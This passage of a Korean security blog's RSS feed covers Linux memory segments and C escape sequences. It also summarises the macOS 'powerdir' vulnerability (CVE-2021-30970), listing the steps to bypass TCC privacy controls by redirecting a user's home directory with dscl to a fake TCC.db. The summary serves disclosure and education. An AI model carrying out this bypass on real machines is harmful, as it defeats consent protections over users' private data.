&#xAD8C;&#xD55C;&#xC774; &#xC5C6;&#xC774; &#xC77D;&#xAE30; &#xAD8C;&#xD55C;&#xB9CC; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xC138;&#xADF8;&#xBA3C;&#xD2B8;&#xC778; rodata &#xC138;&#xADF8;&#xBA3C;&#xD2B8;&#xB85C; &#xB098;&#xB258;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><h3 id="BSS-&#xC138;&#xADF8;&#xBA3C;&#xD2B8;"><a href="#BSS-&#xC138;&#xADF8;&#xBA3C;&#xD2B8;" class="headerlink" title="BSS &#xC138;&#xADF8;&#xBA3C;&#xD2B8;"></a>BSS &#xC138;&#xADF8;&#xBA3C;&#xD2B8;</h3><p>&#xB2E4;&#xC74C;&#xC73C;&#xB85C;&#xB294; BSS &#xC138;&#xADF8;&#xBA3C;&#xD2B8;&#xC785;&#xB2C8;&#xB2E4;. BSS &#xC138;&#xADF8;&#xBA3C;&#xD2B8;&#xB294; &#xCEF4;&#xD30C;&#xC77C; &#xC2DC;&#xC5D0; &#xAC12;&#xC774; &#xC815;&#xD574;&#xC9C0;&#xC9C0; &#xC54A;&#xB294; &#xC804;&#xC5ED; &#xBCC0;&#xC218;&#xAC00; &#xC704;&#xCE58;&#xD558;&#xB294; &#xBA54;&#xBAA8;&#xB9AC; &#xC601;&#xC5ED;&#xC785;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xC138;&#xADF8;&#xBA3C;&#xD2B8;&#xC5D0;&#xB294; &#xC77D;&#xAE30;, &#xC4F0;&#xAE30; &#xAD8C;&#xD55C;&#xC774; &#xBD80;&#xC5EC;&#xB418;&#xBA70; &#xD504;&#xB85C;&#xADF8;&#xB7A8; &#xC2DC;&#xC791; &#xC2DC;&#xC5D0;&#xB294; &#xBAA8;&#xB450; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0;&#xC11C; &#xAC12;&#xC774; 0&#xC73C;&#xB85C; &#xCD08;&#xAE30;&#xD654;&#xB418;&#xC5B4; &#xB4E4;&#xC5B4;&#xAC11;&#xB2C8;&#xB2E4;.</p><h3 id="&#xC2A4;&#xD0DD;-&#xC138;&#xADF8;&#xBA3C;&#xD2B8;"><a href="#&#xC2A4;&#xD0DD;-&#xC138;&#xADF8;&#xBA3C;&#xD2B8;" class="headerlink" title="&#xC2A4;&#xD0DD; &#xC138;&#xADF8;&#xBA3C;&#xD2B8;"></a>&#xC2A4;&#xD0DD; &#xC138;&#xADF8;&#xBA3C;&#xD2B8;</h3><p>&#xC2A4;&#xD0DD;&#xACFC; &#xD799; &#xC138;&#xADF8;&#xBA3C;&#xD2B8;&#xB294; &#xADF8;&#xB9BC;&#xC5D0;&#xC11C; &#xC810;&#xC120;&#xC73C;&#xB85C; &#xD45C;&#xC2DC;&#xD588;&#xB294;&#xB370;&#xC694;. &#xC2A4;&#xD0DD;&#xACFC; &#xD799;&#xC740; &#xC0C1;&#xD669;&#xC5D0; &#xB9DE;&#xAC8C; &#xD655;&#xC7A5;&#xB418;&#xB294; &#xC138;&#xADF8;&#xBA3C;&#xD2B8;&#xC774;&#xAE30; &#xB54C;&#xBB38;&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xC2A4;&#xD0DD; &#xC138;&#xADF8;&#xBA3C;&#xD2B8;&#xB294; &#xB9D0; &#xADF8;&#xB300;&#xB85C; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xC2A4;&#xD0DD;&#xC774; &#xC704;&#xCE58;&#xD558;&#xB294; &#xBA54;&#xBAA8;&#xB9AC; &#xC601;&#xC5ED; &#xC785;&#xB2C8;&#xB2E4;. &#xB370;&#xC774;&#xD130;&#xC5D0; &#xC811;&#xADFC;&#xD574; &#xC0AC;&#xC6A9;&#xD558;&#xACE0; &#xC218;&#xC815;&#xD574;&#xC57C;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC77D;&#xAE30;, &#xC4F0;&#xAE30; &#xAD8C;&#xD55C;&#xC774; &#xBD80;&#xC5EC;&#xB418;&#xACE0; &#xBA54;&#xBAA8;&#xB9AC;&#xC758; &#xB05D;&#xC5D0; &#xC704;&#xCE58;&#xD574; &#xB192;&#xC740; &#xC8FC;&#xC18C;&#xC5D0;&#xC11C; &#xB0AE;&#xC740; &#xC8FC;&#xC18C; &#xBC29;&#xD5A5;&#xC73C;&#xB85C; &#xAC00;&#xBCC0;&#xC801;&#xC73C;&#xB85C; &#xD655;&#xC7A5;&#xB418;&#xB294; &#xAC00;&#xBCC0;&#xC801;&#xC778; &#xC138;&#xADF8;&#xBA3C;&#xD2B8; &#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xAC00;&#xBCC0;&#xC801;&#xC778; &#xC138;&#xADF8;&#xBA3C;&#xD2B8; &#xD615;&#xC2DD;&#xC73C;&#xB85C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xC774;&#xC720;&#xC5D0; &#xB300;&#xD574; &#xC54C;&#xC544;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC2A4;&#xD0DD; &#xC138;&#xADF8;&#xBA3C;&#xD2B8;&#xB294; &#xC2A4;&#xD0DD; &#xD504;&#xB808;&#xC784;&#xC774;&#xB77C;&#xB294; &#xB2E8;&#xC704;&#xB85C; &#xC0AC;&#xC6A9;&#xC774; &#xB418;&#xB294;&#xB370;, &#xC774; &#xC2A4;&#xD0DD; &#xD504;&#xB808;&#xC784;&#xC740; &#xD568;&#xC218; &#xD638;&#xCD9C;&#xC2DC;&#xC5D0; &#xC0DD;&#xC131;&#xC774; &#xB418;&#xACE0; &#xBC18;&#xD658;&#xC2DC;&#xC5D0; &#xD574;&#xC81C;&#xAC00; &#xB418;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. &#xADF8;&#xB807;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC758; &#xC2E4;&#xD589;&#xD750;&#xB984;&#xC5D0; &#xB530;&#xB77C; &#xD568;&#xC218;&#xAC00; &#xD638;&#xCD9C;&#xB420; &#xC218;&#xB3C4; &#xC788;&#xACE0; &#xC548;&#xB420; &#xC218;&#xB3C4; &#xC788;&#xB2E4;&#xBA74; &#xC2E4;&#xC9C8;&#xC801;&#xC73C;&#xB85C; &#xC2A4;&#xD0DD; &#xC138;&#xADF8;&#xBA3C;&#xD2B8;&#xAC00; &#xC5BC;&#xB9C8;&#xB098; &#xD544;&#xC694;&#xB85C; &#xD560;&#xC9C0;&#xB294; &#xC815;&#xD655;&#xD788; &#xACC4;&#xC0B0;&#xD558;&#xAE30; &#xC5B4;&#xB824;&#xC6B8;&#xAC81;&#xB2C8;&#xB2E4;. &#xADF8;&#xB798;&#xC11C; &#xC2A4;&#xD0DD; &#xC138;&#xADF8;&#xBA3C;&#xD2B8;&#xB294; &#xC774;&#xB807;&#xAC8C; &#xD544;&#xC694;&#xC5D0; &#xB530;&#xB77C; &#xD655;&#xC7A5;&#xD558;&#xB294; &#xAC00;&#xBCC0;&#xC801;&#xC778; &#xC138;&#xADF8;&#xBA3C;&#xD2B8; &#xD615;&#xC2DD;&#xC744; &#xCC44;&#xD0DD;&#xD558;&#xC5EC; &#xC0AC;&#xC6A9;&#xD558;&#xAC8C; &#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="&#xD799;-&#xC138;&#xADF8;&#xBA3C;&#xD2B8;"><a href="#&#xD799;-&#xC138;&#xADF8;&#xBA3C;&#xD2B8;" class="headerlink" title="&#xD799; &#xC138;&#xADF8;&#xBA3C;&#xD2B8;"></a>&#xD799; &#xC138;&#xADF8;&#xBA3C;&#xD2B8;</h3><p>&#xD799; &#xC138;&#xADF8;&#xBA3C;&#xD2B8;&#xB294;, C&#xC5B8;&#xC5B4;&#xC5D0;&#xC11C; <code>malloc()</code>, <code>calloc()</code>&#xACFC; &#xAC19;&#xC740; &#xD568;&#xC218;&#xB97C; &#xD1B5;&#xD574; &#xD504;&#xB85C;&#xADF8;&#xB7A8; &#xC2E4;&#xD589;&#xC911; &#xB3D9;&#xC801;&#xC73C;&#xB85C; &#xD560;&#xB2F9;&#xBC1B;&#xB294; &#xBA54;&#xBAA8;&#xB9AC;&#xAC00; &#xC704;&#xCE58;&#xD558;&#xB294; &#xC601;&#xC5ED;&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xC2A4;&#xD0DD;&#xACFC; &#xB9C8;&#xCC2C;&#xAC00;&#xC9C0;&#xB85C; &#xC811;&#xADFC;&#xD574; &#xC0AC;&#xC6A9;&#xD558;&#xACE0; &#xC218;&#xC815;&#xC774; &#xAC00;&#xB2A5;&#xD574;&#xC57C;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC77D;&#xAE30;&#xC640; &#xC4F0;&#xAE30; &#xAD8C;&#xD55C;&#xC774; &#xBD80;&#xC5EC;&#xB418;&#xBA70;, &#xD544;&#xC694;&#xC2DC;&#xB9C8;&#xB2E4; &#xC2A4;&#xD0DD;&#xACFC; &#xAC19;&#xC740; &#xC774;&#xC720;&#xB85C; &#xAC00;&#xBCC0;&#xC801;&#xC778; &#xC138;&#xADF8;&#xBA3C;&#xD2B8; &#xD615;&#xC2DD;&#xC73C;&#xB85C; &#xC0AC;&#xC6A9;&#xD574; &#xD799; &#xC138;&#xADF8;&#xBA3C;&#xD2B8;&#xB97C; &#xD655;&#xC7A5;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xD558;&#xC9C0;&#xB9CC; &#xD799;&#xACFC; &#xC2A4;&#xD0DD; &#xC138;&#xADF8;&#xBA3C;&#xD2B8; &#xBAA8;&#xB450; &#xD655;&#xC7A5;&#xC774; &#xAC00;&#xB2A5;&#xD55C; &#xAC00;&#xBCC0;&#xC801;&#xC778; &#xC138;&#xADF8;&#xBA3C;&#xD2B8;&#xC774;&#xACE0; &#xADF8;&#xB85C; &#xC778;&#xD574; &#xC11C;&#xB85C;&#xC758; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xCE68;&#xBC94;&#xD560; &#xAC00;&#xB2A5;&#xC131;&#xC774; &#xC788;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xD799; &#xC138;&#xADF8;&#xBA3C;&#xD2B8;&#xB294; &#xB0AE;&#xC740; &#xC8FC;&#xC18C; &#xBC29;&#xD5A5;&#xC5D0;&#xC11C; &#xB192;&#xC740; &#xC8FC;&#xC18C; &#xBC29;&#xD5A5;&#xC73C;&#xB85C; &#xD655;&#xC7A5;&#xC744; &#xD569;&#xB2C8;&#xB2E4;. &#xC2A4;&#xD0DD;&#xC774; &#xBA54;&#xBAA8;&#xB9AC; &#xB05D;&#xC5D0; &#xC704;&#xCE58;&#xD558;&#xB294; &#xAC83;&#xB3C4; &#xD799; &#xC601;&#xC5ED;&#xACFC; &#xBC18;&#xB300;&#xB85C; &#xC790;&#xB77C;&#xAC8C; &#xD558;&#xC5EC; &#xBE44;&#xAD50;&#xC801;&#xC73C;&#xB85C; &#xC11C;&#xB85C;&#xC758; &#xBA54;&#xBAA8;&#xB9AC;&#xAC00; &#xCE68;&#xBC94;&#xB418;&#xB294; &#xBB38;&#xC81C;&#xB85C; &#xBD80;&#xD130; &#xC790;&#xC720;&#xB86D;&#xAC8C; &#xD558;&#xAE30; &#xC704;&#xD568;&#xC785;&#xB2C8;&#xB2E4;. </p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Hackypedia/">Hackypedia</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/heap/">heap</category>
      
      <category domain="https://hackyboiz.github.io/tags/stack/">stack</category>
      
      <category domain="https://hackyboiz.github.io/tags/poosic/">poosic</category>
      
      <category domain="https://hackyboiz.github.io/tags/memory-layout/">memory layout</category>
      
      <category domain="https://hackyboiz.github.io/tags/segment/">segment</category>
      
      
      <comments>https://hackyboiz.github.io/2022/01/14/poosic/linux-memory-layout/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[해키피디아] Escape Character(Escape Sequence)</title>
      <link>https://hackyboiz.github.io/2022/01/12/y00n_nms/escape-character/</link>
      <guid>https://hackyboiz.github.io/2022/01/12/y00n_nms/escape-character/</guid>
      <pubDate>Wed, 12 Jan 2022 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;&amp;#xC774;&amp;#xC2A4;&amp;#xCF00;&amp;#xC774;&amp;#xD504; &amp;#xBB38;&amp;#xC790;(Escape Character, Escape Sequence)&amp;#xB294; &amp;#xBC31;&amp;#xC2AC;&amp;#xB798;&amp;#xC2DC;(bac</description>
        
      
      
      
      <content:encoded><![CDATA[<p>&#xC774;&#xC2A4;&#xCF00;&#xC774;&#xD504; &#xBB38;&#xC790;(Escape Character, Escape Sequence)&#xB294; &#xBC31;&#xC2AC;&#xB798;&#xC2DC;(backslash, <code>\</code>, <code>&#x20A9;</code>)&#xC640; &#xD2B9;&#xC815; &#xBB38;&#xC790;&#xB97C; &#xACB0;&#xD569;&#xD55C; &#xAC83;&#xC73C;&#xB85C; &#xD2B9;&#xC815; &#xAE30;&#xB2A5;&#xC744; &#xC81C;&#xACF5;&#xD558;&#xAC70;&#xB098; &#xC2E4;&#xD589; &#xBB38;&#xC790; &#xC9D1;&#xD569;(&#xBAA8;&#xB4E0; &#xC804;&#xCC98;&#xB9AC; &#xB2E8;&#xACC4; &#xD6C4; &#xCEF4;&#xD30C;&#xC77C; &#xB2E8;&#xACC4;&#xC5D0; &#xC785;&#xB825; &#xB418;&#xB294; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC758; &#xD14D;&#xC2A4;&#xD2B8;&#xC5D0; &#xC0AC;&#xC6A9; &#xB418;&#xB294; &#xC778;&#xCF54;&#xB529;)&#xC758; &#xBAA8;&#xB4E0; &#xAD6C;&#xC131;&#xC694;&#xC18C;&#xB97C; &#xB098;&#xD0C0;&#xB0BC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC608;&#xB97C; &#xB4E4;&#xC5B4;, &#xC774;&#xC2A4;&#xCF00;&#xC774;&#xD504; &#xC2DC;&#xD000;&#xC2A4;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xD0ED;, &#xCE90;&#xB9AC;&#xC9C0; &#xB9AC;&#xD134; &#xBC0F; &#xBC31;&#xC2A4;&#xD398;&#xC774;&#xC2A4;&#xC640; &#xAC19;&#xC740; &#xBB38;&#xC790;&#xB97C; &#xCD9C;&#xB825; &#xC2A4;&#xD2B8;&#xB9BC;&#xC5D0; &#xB123;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xC2A4;&#xCF00;&#xC774;&#xD504; &#xBB38;&#xC790;&#xC5D0;&#xB294; &#xBC31;&#xC2AC;&#xB798;&#xC2DC;() &#xAE30;&#xD638;&#xC640; &#xBB38;&#xC790; &#xB610;&#xB294; 8&#xC9C4;&#xC218; &#xB610;&#xB294; 16&#xC9C4;&#xC218; &#xC22B;&#xC790;&#xAC00; &#xD3EC;&#xD568;&#xB429;&#xB2C8;&#xB2E4;. 16&#xC9C4;&#xBC95; &#xC774;&#xC2A4;&#xCF00;&#xC774;&#xD504; &#xC2DC;&#xD000;&#xC2A4;&#xC5D0;&#xB294; x &#xB4A4;&#xC5D0; &#xD558;&#xB098; &#xC774;&#xC0C1;&#xC758; 16&#xC9C4;&#xBC95; &#xC22B;&#xC790;(0-9, A-F, a-f)&#xAC00; &#xC635;&#xB2C8;&#xB2E4;. 8&#xC9C4;&#xC218; &#xC774;&#xC2A4;&#xCF00;&#xC774;&#xD504; &#xC2DC;&#xD000;&#xC2A4;&#xB294; &#xCD5C;&#xB300; 3&#xAC1C;&#xC758; 8&#xC9C4;&#xC218;(0-7)&#xB97C; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;. 16&#xC9C4;&#xC218; &#xB610;&#xB294; 8&#xC9C4;&#xC218; &#xAC12;&#xC740; &#xC6D0;&#xD558;&#xB294; &#xBB38;&#xC790; &#xB610;&#xB294; &#xC640;&#xC774;&#xB4DC; &#xBB38;&#xC790;&#xC758; &#xAC12;&#xC744; &#xC9C0;&#xC815;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC608;&#xC2DC;&#xB85C; C &#xC5B8;&#xC5B4;&#xC5D0;&#xC11C; <code>Hello</code>&#xB97C; &#xCD9C;&#xB825;&#xD558;&#xACE0; &#xC2F6;&#xC73C;&#xBA74; <code>printf(&quot; Hello &quot;);</code> &#xB85C; &#xCD9C;&#xB825;&#xD560; &#xC218; &#xC788;&#xC9C0;&#xB9CC;, &#xB9CC;&#xC57D; <code>&quot;Hello&quot;</code>&#xB97C; &#xCD9C;&#xB825;&#xD558;&#xACE0; &#xC2F6;&#xC5B4; &#xADF8;&#xB300;&#xB85C; <code>printf(&quot; &quot;Hello&quot; &quot;);</code>&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xBA74; &#xC624;&#xB958;&#xAC00; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;. &#xADF8; &#xC774;&#xC720;&#xB294; &#xCCAB; &#xBC88;&#xC9F8; <code>&quot; &quot;</code> &#xC774;&#xD6C4;&#xB85C; <code>);</code>&#xB85C; &#xB05D;&#xB098;&#xC57C; &#xD558;&#xC9C0;&#xB9CC; &#xC774;&#xC5B4;&#xC11C; <code>Hello&#x201D; &#x201C;</code>&#xAC00; &#xC774;&#xC5B4;&#xC84C;&#xAE30; &#xB54C;&#xBB38;&#xC785;&#xB2C8;&#xB2E4;.</p><p><code>&quot;</code>&#xB97C; &#xCD9C;&#xB825;&#xD558;&#xACE0; &#xC2F6;&#xB2E4;&#xBA74; &#xBC31;&#xC2AC;&#xB798;&#xC2DC;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; <code>printf(&quot; \&quot;Hello\&quot; &quot; );</code>&#xB85C; &#xCD9C;&#xB825;&#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xADF8; &#xC678;&#xC5D0;&#xB3C4; &#xB9CE;&#xC740; &#xC0AC;&#xB78C;&#xB4E4;&#xC774; <code>printf(&quot; Hello \n&quot;);</code>&#xC5D0;&#xC11C; <code>\n</code>&#xC73C;&#xB85C; &#xC904;&#xBC14;&#xAFC8;(&#xAC1C;&#xD589;)&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xAC83;&#xC744; &#xC81C;&#xC77C; &#xC775;&#xC219;&#xD558;&#xAC8C; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;.</p><p><code>\n</code>&#xACFC; <code>\&quot;</code>&#xC744; &#xD3EC;&#xD568;&#xD558;&#xC5EC; &#xC0AC;&#xC6A9;&#xB418;&#xACE0; &#xC788;&#xB294; &#xC774;&#xC2A4;&#xCF00;&#xC774;&#xD504; &#xBB38;&#xC790;&#xB294; <a href="(https://docs.microsoft.com/ko-kr/cpp/c-language/escape-sequences?view=msvc-160">&#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</a>)</p><p><code>\a</code>: &#xACBD;&#xACE0;</p><p><code>\b</code>: &#xBC31;&#xC2A4;&#xD398;&#xC774;&#xC2A4; </p><p><code>\f</code>: &#xD3FC; &#xD53C;&#xB4DC;</p><p><code>\n</code>: &#xC904; &#xBC14;&#xAFC8; </p><p><code>\r</code>: &#xCE90;&#xB9AC;&#xC9C0; &#xB9AC;&#xD134; </p><p><code>\t</code>: &#xAC00;&#xB85C; &#xD0ED; </p><p><code>\v</code>: &#xC138;&#xB85C; &#xD0ED;</p><p><code>\&apos;</code>: &#xC791;&#xC740; &#xB530;&#xC74C;&#xD45C;</p><p><code>\&quot;</code>: &#xD070; &#xB530;&#xC74C;&#xD45C;</p><p><code>\\</code>: &#xBC31;&#xC2AC;&#xB798;&#xC2DC;</p><p><code>\?</code>: &#xBB3C;&#xC74C;&#xD45C; </p><p><code>\ooo</code>: 8&#xC9C4;&#xC218; &#xD45C;&#xAE30;&#xBC95;&#xC758; ASCII &#xBB38;&#xC790; </p><p><code>\xhh</code>: 16&#xC9C4;&#xC218; &#xD45C;&#xAE30;&#xBC95;&#xC758; ASCII &#xBB38;&#xC790; </p><p><code>\xhhh</code>: &#xC640;&#xC774;&#xB4DC; &#xBB38;&#xC790; &#xC0C1;&#xC218; &#xB610;&#xB294; &#xC720;&#xB2C8;&#xCF54;&#xB4DC; &#xBB38;&#xC790;&#xC5F4; &#xB9AC;&#xD130;&#xB7F4;&#xC5D0; &#xC0AC;&#xC6A9;&#xB418;&#xB294; &#xACBD;&#xC6B0; 16&#xC9C4;&#xC218; &#xD45C;&#xAE30;&#xBC95;&#xC758; &#xC720;&#xB2C8;&#xCF54;&#xB4DC; &#xBB38;&#xC790;</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Hackypedia/">Hackypedia</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/y00n-nms/">y00n_nms</category>
      
      <category domain="https://hackyboiz.github.io/tags/escape-character/">escape character</category>
      
      
      <comments>https://hackyboiz.github.io/2022/01/12/y00n_nms/escape-character/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2021-30970: New macOS vulnerability, powerdir</title>
      <link>https://hackyboiz.github.io/2022/01/10/fabu1ous/2022-01-10/</link>
      <guid>https://hackyboiz.github.io/2022/01/10/fabu1ous/2022-01-10/</guid>
      <pubDate>Mon, 10 Jan 2022 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://www.microsoft.com/security/blog/2022/01/10/new-ma</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.microsoft.com/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/">New macOS vulnerability, &#x201C;powerdir,&#x201D; could lead to unauthorized user data access</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Transparency, Consent, and Control</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>Microsoft&#xC5D0;&#xC11C; &#x201C;powerdir&#x201D;&#xB77C;&#xB294; &#xC774;&#xB984;&#xC758; MacOS &#xCDE8;&#xC57D;&#xC810;(CVE-2021-30970)&#xC744; &#xACF5;&#xAC1C;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC545;&#xC6A9;&#xD558;&#xBA74; MacOS&#xC758; TCC(Transparency, Consent, and Control) &#xD504;&#xB808;&#xC784;&#xC6CC;&#xD06C;&#xB97C; &#xC6B0;&#xD68C;&#xD558;&#xACE0; user data&#xC5D0; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>TCC &#xD504;&#xB808;&#xC784;&#xC6CC;&#xD06C;&#xB294; &#xC124;&#xCE58;&#xB41C; &#xC751;&#xC6A9; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC774; &#xC0AC;&#xC6A9;&#xC790;&#xC758; &#xD5C8;&#xAC00; &#xC5C6;&#xC774; &#xBBFC;&#xAC10;&#xD55C; &#xC0AC;&#xC6A9;&#xC790; &#xB370;&#xC774;&#xD130;&#xC5D0; &#xC811;&#xADFC;&#xD558;&#xB294; &#xAC83;&#xC744; &#xAC70;&#xBD80;&#xD558;&#xB294; Apple&#xC758; subsystem&#xC785;&#xB2C8;&#xB2E4;. &#xC774;&#xC804;&#xC5D0;&#xB3C4; &#xAC00;&#xC9DC; TCC.db &#xD30C;&#xC77C;&#xC744; &#xC0DD;&#xC131;&#xD558;&#xB294; &#xBC29;&#xBC95;&#xC73C;&#xB85C; TCC&#xB97C; &#xC6B0;&#xD68C;&#xD558;&#xB294; &#xCDE8;&#xC57D;&#xC810;(<a href="https://hackyboiz.github.io/2021/11/02/fabu1ous/2021-11-02/">CVE-2021-30920</a>)&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xACE0; &#xC774;&#xB97C; &#xBC29;&#xC9C0;&#xD558;&#xAE30; &#xC704;&#xD574; full disk access &#xAD8C;&#xD55C;&#xC774; &#xC788;&#xB294; &#xC751;&#xC6A9;&#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xB9CC;&#xC774; TCC.db&#xC5D0; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC788;&#xB3C4;&#xB85D; &#xD328;&#xCE58;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xD558;&#xC9C0;&#xB9CC; &#xC0AC;&#xC6A9;&#xC790;&#xC758; &#xB514;&#xB809;&#xD130;&#xB9AC; &#xC11C;&#xBE44;&#xC2A4; entry&#xC640; home &#xB514;&#xB809;&#xD130;&#xB9AC;&#xB97C; &#xBCC0;&#xACBD;&#xD558;&#xBA74; <code>kTCCServiceSystemPolicySysAdminFiles</code> &#xC815;&#xCC45;&#xC774; &#xC801;&#xC6A9;&#xB41C; &#xC751;&#xC6A9;&#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC73C;&#xB85C;&#xB3C4; TCC.db&#xC5D0; &#xC811;&#xADFC;&#xD558;&#xACE0; TCC &#xC124;&#xC815;&#xC744; &#xBCC0;&#xACBD;&#xD560; &#xC218; &#xC788;&#xAC8C;&#xB429;&#xB2C8;&#xB2E4;.</p><ol><li>&#xAC00;&#xC9DC; TCC.db&#xB97C; &#xC0DD;&#xC131;</li><li>dsexport &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xC0AC;&#xC6A9;&#xD574; &#xC720;&#xC800; &#xB514;&#xB809;&#xD130;&#xB9AC; &#xC11C;&#xBE44;&#xC2A4; entry&#xB97C; export</li><li>&#xC720;&#xC800; &#xB514;&#xB809;&#xD130;&#xB9AC; &#xC11C;&#xBE44;&#xC2A4; entry&#xC640; home &#xB514;&#xB809;&#xD130;&#xB9AC;&#xB97C; &#xBCC0;&#xACBD;</li><li>dsimport&#xB97C; &#xC0AC;&#xC6A9;&#xD574; &#xC720;&#xC800; &#xB514;&#xB809;&#xD130;&#xB9AC; &#xC11C;&#xBE44;&#xC2A4; entry&#xB97C; import</li><li>tccd &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB97C; &#xC7AC;&#xC2DC;&#xC791;</li></ol><pre><code class="hljs awk">sudo dscl .-create <span class="hljs-regexp">/Users/</span><span class="hljs-variable">$TARGET_USER</span> NFSHomeDirectory <span class="hljs-regexp">/tmp/</span>fakedir</code></pre>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/bypass/">bypass</category>
      
      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
      
      <category domain="https://hackyboiz.github.io/tags/macos/">macos</category>
      
      <category domain="https://hackyboiz.github.io/tags/tcc/">tcc</category>
      
      
      <comments>https://hackyboiz.github.io/2022/01/10/fabu1ous/2022-01-10/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] Hip하게 Heap 정복하기 Part 5 - HITCON 2020 Michael&#39;s Storage(3)</title>
      <link>https://hackyboiz.github.io/2022/01/09/l0ch/segment-heap-part5/</link>
      <guid>https://hackyboiz.github.io/2022/01/09/l0ch/segment-heap-part5/</guid>
      <pubDate>Sun, 09 Jan 2022 09:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;&amp;#xC2DC;&amp;#xB9AC;&amp;#xC988;-&amp;#xBC14;&amp;#xB85C;&amp;#xAC00;&amp;#xAE30;&quot;&gt;&lt;a href=&quot;#&amp;#xC2DC;&amp;#xB9AC;&amp;#xC988;-&amp;#xBC14;&amp;#xB85C;&amp;#xAC00;&amp;#xAE30;&quot; clas</description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="&#xC2DC;&#xB9AC;&#xC988;-&#xBC14;&#xB85C;&#xAC00;&#xAE30;"><a href="#&#xC2DC;&#xB9AC;&#xC988;-&#xBC14;&#xB85C;&#xAC00;&#xAE30;" class="headerlink" title="&#xC2DC;&#xB9AC;&#xC988; &#xBC14;&#xB85C;&#xAC00;&#xAE30;"></a>&#xC2DC;&#xB9AC;&#xC988; &#xBC14;&#xB85C;&#xAC00;&#xAE30;</h1><p><a href="https://hackyboiz.github.io/2021/09/19/l0ch/segment-heap-part1/">Hip&#xD558;&#xAC8C; Heap &#xC815;&#xBCF5;&#xD558;&#xAE30; Part 1 - Segment Heap(1)</a><br><a href="https://hackyboiz.github.io/2021/10/10/l0ch/segment-heap-part2/">Hip&#xD558;&#xAC8C; Heap &#xC815;&#xBCF5;&#xD558;&#xAE30; Part 2 - Segment Heap(2)</a><br><a href="https://hackyboiz.github.io/2021/11/21/l0ch/segment-heap-part3/">Hip&#xD558;&#xAC8C; Heap &#xC815;&#xBCF5;&#xD558;&#xAE30; Part 3 - HITCON 2020 Michael&#x2019;s Storage </a><br><a href="https://hackyboiz.github.io/2021/12/19/l0ch/segment-heap-part4/">Hip&#xD558;&#xAC8C; Heap 